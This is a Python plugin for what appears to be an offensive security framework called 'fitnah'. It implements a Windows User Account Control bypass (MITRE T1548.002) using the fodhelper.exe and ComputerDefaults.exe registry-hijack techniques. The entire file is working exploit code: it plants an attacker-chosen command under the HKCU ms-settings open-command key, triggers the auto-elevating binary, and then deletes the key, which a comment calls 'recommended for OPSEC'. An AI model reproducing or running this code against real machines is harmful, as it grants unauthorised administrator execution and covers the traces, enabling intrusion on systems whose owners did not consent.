import os
import subprocess
import time
from fitnah.sdk.base_plugin import BasePlugin, PluginCategory
from fitnah.sdk.result import PluginResult


class UacBypassPlugin(BasePlugin):
    """
    UAC Bypass (T1548.002)
    Bypass User Account Control to execute commands with high integrity.
    Methods:
    - Fodhelper (Registry Hijack)
    - ComputerDefaults (Registry Hijack)
    """

    name = "uac_bypass"
    category = PluginCategory.PRIVILEGE_ESCALATION
    description = "Bypass UAC to execute commands as Administrator"

    def run(self, command: str, method: str = "fodhelper") -> PluginResult:
        self.log_info(f"Attempting UAC bypass using method: {method}")
        
        if method == "fodhelper":
            success = self._fodhelper_bypass(command)
        elif method == "computerdefaults":
            success = self._computerdefaults_bypass(command)
        else:
            return PluginResult.error(f"Unknown UAC bypass method: {method}")

        if success:
            return PluginResult.success(f"Successfully triggered UAC bypass for: {command}")
        else:
            return PluginResult.error(f"Failed to trigger UAC bypass using {method}")

    def _fodhelper_bypass(self, command: str) -> bool:
        """
        Bypass UAC using fodhelper.exe registry hijacking.
        """
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        try:
            # 1. Create registry keys
            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/v", "DelegateExecute", "/t", "REG_SZ", "/f"], capture_output=True)
            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/ve", "/t", "REG_SZ", "/d", command, "/f"], capture_output=True)
            
            # 2. Trigger fodhelper.exe
            subprocess.run(["fodhelper.exe"], capture_output=True)
            
            # 3. Cleanup (optional but recommended for OPSEC)
            time.sleep(2)
            subprocess.run(["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"], capture_output=True)
            
            return True
        except Exception as e:
            self.log_error(f"Fodhelper bypass failed: {e}")
            return False

    def _computerdefaults_bypass(self, command: str) -> bool:
        """
        Bypass UAC using ComputerDefaults.exe registry hijacking.
        """
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        try:
            # 1. Create registry keys
            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/v", "DelegateExecute", "/t", "REG_SZ", "/f"], capture_output=True)
            subprocess.run(["reg", "add", f"HKCU\\{reg_path}", "/ve", "/t", "REG_SZ", "/d", command, "/f"], capture_output=True)
            
            # 2. Trigger ComputerDefaults.exe
            subprocess.run(["ComputerDefaults.exe"], capture_output=True)
            
            # 3. Cleanup
            time.sleep(2)
            subprocess.run(["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"], capture_output=True)
            
            return True
        except Exception as e:
            self.log_error(f"ComputerDefaults bypass failed: {e}")
            return False
